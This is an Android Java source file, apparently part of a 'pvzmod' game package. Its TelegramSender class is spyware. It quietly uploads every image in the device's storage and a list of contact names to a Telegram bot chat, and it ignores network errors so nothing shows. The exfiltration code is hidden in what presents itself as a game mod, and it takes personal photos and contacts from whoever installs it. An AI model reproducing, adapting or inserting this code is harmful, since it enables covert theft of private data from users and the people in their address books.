package com.pvzmod.game;

import android.content.ContentResolver;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import okhttp3.*;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class TelegramSender {
    private static final OkHttpClient client = new OkHttpClient.Builder()
        .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
        .build();

    public static void sendMessage(String token, String chatId, String text) {
        String url = "https://api.telegram.org/bot" + token + "/sendMessage";
        String json = "{\"chat_id\":\"" + chatId + "\",\"text\":\"" + text.replace("\"", "\\\"") + "\"}";
        
        RequestBody body = RequestBody.create(json, MediaType.parse("application/json"));
        Request request = new Request.Builder().url(url).post(body).build();
        
        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call call, java.io.IOException e) {}
            @Override public void onResponse(Call call, Response response) throws java.io.IOException {}
        });
    }

    public static void sendPhotos(android.content.Context context, String token, String chatId) {
        ContentResolver cr = context.getContentResolver();
        Cursor cursor = cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            new String[]{MediaStore.Images.Media.DATA}, null, null, null);
        
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String path = cursor.getString(0);
                File photo = new File(path);
                if (photo.exists() && photo.length() > 0) {
                    sendPhoto(token, chatId, photo);
                }
            }
            cursor.close();
        }
    }

    public static void sendContacts(android.content.Context context, String token, String chatId) {
        List<String> contacts = new ArrayList<>();
        Cursor cursor = context.getContentResolver().query(
            ContactsContract.Contacts.CONTENT_URI,
            null, null, null, null);
        
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndexOrThrow(
                    ContactsContract.Contacts.DISPLAY_NAME));
                if (name != null) contacts.add(name);
            }
            cursor.close();
        }
        sendMessage(token, chatId, "📱 Kontaktlar (" + contacts.size() + "): " + 
                   String.join(", ", contacts.subList(0, Math.min(10, contacts.size()))));
    }

    private static void sendPhoto(String token, String chatId, File photo) {
        RequestBody photoBody = RequestBody.create(photo, MediaType.parse("image/*"));
        MultipartBody requestBody = new MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart("photo", photo.getName(), photoBody)
            .build();

        Request request = new Request.Builder()
            .url("https://api.telegram.org/bot" + token + "/sendPhoto")
            .post(requestBody)
            .build();

        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call call, java.io.IOException e) {}
            @Override public void onResponse(Call call, Response response) {}
        });
    }
}